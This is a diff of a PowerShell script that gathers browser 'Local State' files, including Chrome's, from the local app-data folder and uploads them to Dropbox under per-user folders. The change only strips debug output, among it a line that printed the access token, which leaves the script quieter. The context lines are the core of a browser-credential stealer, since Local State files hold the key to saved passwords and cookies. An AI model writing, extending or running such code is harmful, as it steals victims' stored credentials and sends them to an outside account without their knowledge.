@@ -1,6 +1,4 @@
 
-Write-Output "AccessToken1: $AccessToken"
-
 # Specify the path to the Local State file
 $paths = @(
     "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
@@ -60,11 +58,9 @@ foreach ($path in $paths) {
         $relativePath = $path.Replace($greatGrandParentDirectory + "\", "")
         $OutPath = Join-Path -Path $currentUser -ChildPath $RelativePath
         Upload-ToDropbox -FilePath $path -DestinationPath $OutPath
-        Write-Output "1"
 
     } catch {
         Write-Output "Failed to upload $path"
-        Write-Output $_.Exception.Message
     }
     
 
